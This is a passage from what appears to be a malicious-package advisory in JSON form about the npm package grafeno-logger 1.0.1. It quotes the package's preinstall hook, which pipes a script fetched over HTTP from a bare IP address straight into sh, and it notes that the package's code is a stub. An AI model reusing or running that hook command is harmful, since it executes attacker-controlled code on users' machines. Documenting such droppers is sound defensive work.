  "summary": "preinstall hook fetches and executes remote shell script from bare IP over plain HTTP",
  "details": "grafeno-logger 1.0.1 declares a preinstall lifecycle hook that pipes a shell script fetched from the bare IP 216.126.236.46 over plain HTTP directly into sh: \"preinstall\": \"curl -s 216.126.236.46/x.sh|sh\". This executes arbitrary attacker-controlled code on the installer's machine at npm install time, with no pinning, no integrity verification, and over an unauthenticated cleartext channel. The shipped index.js is a two-line stub aliasing console.log and console.error, inconsistent with the advertised logging purpose; the manifest and its dropper are effectively the entire payload.",
